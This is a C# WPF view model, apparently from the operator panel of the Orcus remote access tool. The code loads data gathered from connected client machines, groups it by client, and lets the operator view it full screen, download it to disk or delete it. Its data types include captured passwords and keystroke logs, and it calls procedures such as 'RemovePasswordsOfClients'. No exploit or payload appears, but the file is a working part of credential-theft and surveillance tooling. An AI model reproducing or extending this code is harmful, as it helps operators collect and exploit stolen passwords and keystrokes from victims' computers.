using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Data;
using Microsoft.Win32;
using Orcus.Administration.Core;
using Orcus.Administration.Core.DataManagement;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Utilities;
using Orcus.Administration.Plugins.DataManager;
using Orcus.Administration.ViewModels.DataManager;
using Orcus.Administration.ViewModels.DataManager.DataTypes;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.Commands.DataManager;
using Orcus.Shared.Utilities;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels
{
    public class DataManagerViewModel : PropertyChangedBase
    {
        private readonly ConnectionManager _connectionManager;
        private readonly DataConnection _dataConnection;
        private readonly Dictionary<Guid, IDataManagerType> _dataManagerTypes;
        private RelayCommand _closeFullscreenCommand;
        private ICollectionView _collectionView;
        private DownloadTaskViewModel _currentDownloadTask;
        private DataFilter _currentFilter;
        private ObservableCollection<ViewData> _dataEntries;
        private DataViewer _dataViewer;
        private RelayCommand _downloadEntryCommand;
        private DataViewer _fullscreenDataViewer;
        private bool _isLoading;
        private bool _isOpenedInFullscreen;
        private bool _isSplitViewOpened;
        private List<ViewData> _loadedEntries;
        private RelayCommand _openDataCommand;
        private RelayCommand _removeCommand;
        private string _searchText;
        private List<ViewData> _selectedDataEntries;
        private bool _isRemovingData;

        public DataManagerViewModel(ConnectionManager connectionManager, UiModifier uiModifier)
        {
            _connectionManager = connectionManager;
            _dataManagerTypes = new Dictionary<Guid, IDataManagerType>();
            foreach (
                var dataManagerType in
                    new List<IDataManagerType>(uiModifier.DataManagerTypes)
                    {
                        new FileManagerFile(),
                        new FileManagerPasswords(),
                        new FileManagerKeyLog(),
                        new FileManagerDirectory(),
                        new FileManagerDirectoryOld()
                    })
                _dataManagerTypes.Add(dataManagerType.DataTypeGuid, dataManagerType);

            _dataConnection = new DataConnection(connectionManager);
            connectionManager.DataRemoved += ConnectionManagerOnDataRemoved;
            connectionManager.PasswordsRemoved += ConnectionManagerOnPasswordsRemoved;
            connectionManager.DownloadDataReceived += ConnectionManagerOnDownloadDataReceived;
            LoadData();
        }

        public string SearchText
        {
            get { return _searchText; }
            set
            {
                if (SetProperty(value, ref _searchText))
                {
                    _currentFilter = DataFilter.ParseString(value);
                    CollectionView?.Refresh();
                }
            }
        }

        public DataViewer DataViewer
        {
            get { return _dataViewer; }
            set { SetProperty(value, ref _dataViewer); }
        }

        public DataViewer FullscreenDataViewer
        {
            get { return _fullscreenDataViewer; }
            set { SetProperty(value, ref _fullscreenDataViewer); }
        }

        public bool IsSplitViewOpened
        {
            get { return _isSplitViewOpened; }
            set
            {
                if (_isSplitViewOpened != value)
                {
                    _isSplitViewOpened = value;
                    if (value)
                        InitializeView().Forget();
                }
            }
        }

        public ObservableCollection<ViewData> DataEntries
        {
            get { return _dataEntries; }
            set { SetProperty(value, ref _dataEntries); }
        }

        public ICollectionView CollectionView
        {
            get { return _collectionView; }
            set { SetProperty(value, ref _collectionView); }
        }

        public bool IsLoading
        {
            get { return _isLoading; }
            set { SetProperty(value, ref _isLoading); }
        }

        public bool IsOpenedInFullscreen
        {
            get { return _isOpenedInFullscreen; }
            set { SetProperty(value, ref _isOpenedInFullscreen); }
        }

        public RelayCommand OpenDataCommand
        {
            get
            {
                return _openDataCommand ?? (_openDataCommand = new RelayCommand(parameter =>
                {
                    var items = ((IList) parameter).Cast<ViewData>().ToList();
                    if (items.Count == 0)
                        return;

                    _selectedDataEntries = items;
                    if (!items.First().DataManagerType.IsDataViewable)
                        return;

                    OpenData();
                }));
            }
        }

        public RelayCommand CloseFullscreenCommand
        {
            get
            {
                return _closeFullscreenCommand ?? (_closeFullscreenCommand = new RelayCommand(parameter =>
                {
                    var dataViewer = FullscreenDataViewer;
                    FullscreenDataViewer = null;
                    DataViewer = dataViewer;
                    IsOpenedInFullscreen = false;
                }));
            }
        }

        public RelayCommand RemoveCommand
        {
            get
            {
                return _removeCommand ?? (_removeCommand = new RelayCommand(parameter =>
                {
                    if (_selectedDataEntries == null || !_selectedDataEntries.Any())
                        return;

                    if (WindowServiceInterface.Current.ShowMessageBox(
                        _selectedDataEntries.Count == 1
                            ? (string) Application.Current.Resources["SureRemoveDataEntry"]
                            : string.Format((string) Application.Current.Resources["SureRemoveDataEntries"],
                                _selectedDataEntries.Count), (string) Application.Current.Resources["Warning"],
                        MessageBoxButton.OKCancel, MessageBoxImage.Warning) != MessageBoxResult.OK)
                        return;


                    var entriesToRemove = _selectedDataEntries.Where(x => x.Id > -1).Select(x => x.Id).ToList();
                    var passwordsToRemove = _selectedDataEntries.Where(x => x.Id == -1).Select(x => x.ClientId).ToList();

                    if (entriesToRemove.Count > 0)
                        _connectionManager.DataTransferProtocolFactory.ExecuteProcedure("RemoveDataEntries",
                            entriesToRemove);
                    if (passwordsToRemove.Count > 0)
                        _connectionManager.DataTransferProtocolFactory.ExecuteProcedure("RemovePasswordsOfClients",
                            passwordsToRemove);
                }));
            }
        }

        public RelayCommand DownloadEntryCommand
        {
            get
            {
                return _downloadEntryCommand ?? (_downloadEntryCommand = new RelayCommand(parameter =>
                {
                    var item = parameter as ViewData;
                    if (item == null || !item.DataManagerType.CanDownload)
                        return;

                    if (_currentDownloadTask != null)
                        return;

                    var extension = item.DataManagerType.GetFileExtension(item);

                    var sfd = new SaveFileDialog
                    {
                        Filter =
                            $"{item.DataManagerType.TypeId}|*{extension}|{(string) Application.Current.Resources["AllFiles"]}|*.*",
                        FileName = item.EntryName
                    };

                    if (WindowServiceInterface.Current.ShowFileDialog(sfd) != true)
                        return;

                    var downloadViewModel = new DownloadViewModel(item.Size, Path.GetFileName(sfd.FileName), true);

                    _currentDownloadTask = new DownloadTaskViewModel(item, sfd.FileName);
                    _currentDownloadTask.ProgressChanged += (sender, args) =>
                    {
                        downloadViewModel.BytesLoaded = _currentDownloadTask.BytesReceived;
                    };
                    _currentDownloadTask.DownloadFinished += (sender, args) =>
                    {
                        Application.Current.Dispatcher.BeginInvoke(new Action(() => downloadViewModel.Close()));
                        _currentDownloadTask = null;
                    };
                    _currentDownloadTask.DownloadFailed += (sender, args) =>
                    {
                        Application.Current.Dispatcher.BeginInvoke(new Action(() => downloadViewModel.Close()));
                        WindowServiceInterface.Current.ShowMessageBox(
                            (string) Application.Current.Resources["DownloadFailed"],
                            (string) Application.Current.Resources["Error"], MessageBoxButton.OK, MessageBoxImage.Error);
                        _currentDownloadTask = null;
                    };
                    Task.Run(() => _currentDownloadTask.RegisterHash(
                        _connectionManager.DataTransferProtocolFactory.ExecuteFunction<byte[]>("DownloadDataEntry",
                            item.Id)));

                    WindowServiceInterface.Current.OpenWindowDialog(downloadViewModel);
                }));
            }
        }

        private void ConnectionManagerOnDownloadDataReceived(object sender, byte[] bytes)
        {
            _currentDownloadTask?.ReceiveData(bytes);
        }

        private void ConnectionManagerOnPasswordsRemoved(object sender, List<int> clients)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                _isRemovingData = true;
                foreach (var removedEntry in clients)
                {
                    var entry = _dataEntries.FirstOrDefault(x => x.Id == -1 && x.ClientId == removedEntry);
                    if (entry != null)
                        _dataEntries.Remove(entry);
                }
                _isRemovingData = false;
            }));
        }

        private void ConnectionManagerOnDataRemoved(object sender, List<int> removedEntries)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                _isRemovingData = true;
                foreach (var removedEntry in removedEntries)
                {
                    var entry = _dataEntries.FirstOrDefault(x => x.Id == removedEntry);
                    if (entry != null)
                        _dataEntries.Remove(entry);
                }
                _isRemovingData = false;
            }));
        }

        public void SelectedItemsChanged(List<ViewData> selectedEntries)
        {
            _selectedDataEntries = selectedEntries;
            if (IsSplitViewOpened && !_isRemovingData)
                InitializeView().Forget();
        }

        private async Task InitializeView()
        {
            if (_selectedDataEntries == null || !_selectedDataEntries.Any())
                return;

            if (_loadedEntries != null && _selectedDataEntries.ScrambledEquals(_loadedEntries))
                return;

            var firstItem = _selectedDataEntries.First();
            if (!firstItem.DataManagerType.IsDataViewable)
                return;

            if (firstItem.DataManagerType.SupportsMultipleEntries)
            {
                var items =
                    _selectedDataEntries.Where(x => x.DataManagerType == firstItem.DataManagerType)
                        .ToList();
                _loadedEntries = items;
                var view =
                    await firstItem.DataManagerType.GetDataViewer(items.Cast<DataEntry>().ToList(), _dataConnection);
                DataViewer = view;
            }
            else
            {
                _loadedEntries = new List<ViewData> {firstItem};
                var view = await firstItem.DataManagerType.GetDataViewer(firstItem, _dataConnection);
                DataViewer = view;
            }
        }

        private async void LoadData()
        {
            IsLoading = true;
            var rawData = await Task.Run(() => _connectionManager.GetDataEntries());
            var dataEntries = new ObservableCollection<ViewData>();
            foreach (var dataEntry in rawData)
            {
                IDataManagerType dataManagerType;
                var entry = new ViewData(dataEntry);
                if (_dataManagerTypes.TryGetValue(dataEntry.DataType, out dataManagerType))
                {
                    entry.DataManagerType = dataManagerType;
                    dataManagerType.ChangeEntryData(entry);
                }
                else
                {
                    entry.DataManagerType = null;
                }
                dataEntries.Add(entry);
            }

            DataEntries = dataEntries;
            CollectionView = CollectionViewSource.GetDefaultView(dataEntries);
            CollectionView.GroupDescriptions.Add(new PropertyGroupDescription("ClientId"));
            CollectionView.Filter += Filter;
            IsLoading = false;
        }

        private bool Filter(object o)
        {
            return _currentFilter?.IsAccepted((ViewData) o) ?? true;
        }

        private async void OpenData()
        {
            await InitializeView();
            var dataViewer = DataViewer;
            DataViewer = null;
            FullscreenDataViewer = dataViewer;
            IsOpenedInFullscreen = true;
        }
    }
}